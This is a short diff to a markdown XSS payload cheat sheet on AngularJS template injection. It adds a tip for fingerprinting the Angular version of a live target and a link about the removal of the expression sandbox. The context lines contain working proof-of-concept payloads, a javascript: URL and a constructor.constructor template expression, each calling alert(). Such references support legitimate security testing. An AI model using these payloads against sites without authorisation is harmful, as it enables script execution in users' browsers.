@@ -118,6 +118,8 @@ __ javascript:alert(document.domain)
 
 **AngularJS Template Injection based XSS**
 
+*For quick manual testing, run `angular.version` in your browser console to check a live target*
+
 **1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
 
 ```js
@@ -239,7 +241,7 @@ __ javascript:alert(document.domain)
 }}
 ```
 
-**1.6.0+** (no Sandbox) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
+**1.6.0+** (no [Expression Sandbox](http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html)) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
 
 ```js
 {{constructor.constructor('alert(1)')()}}
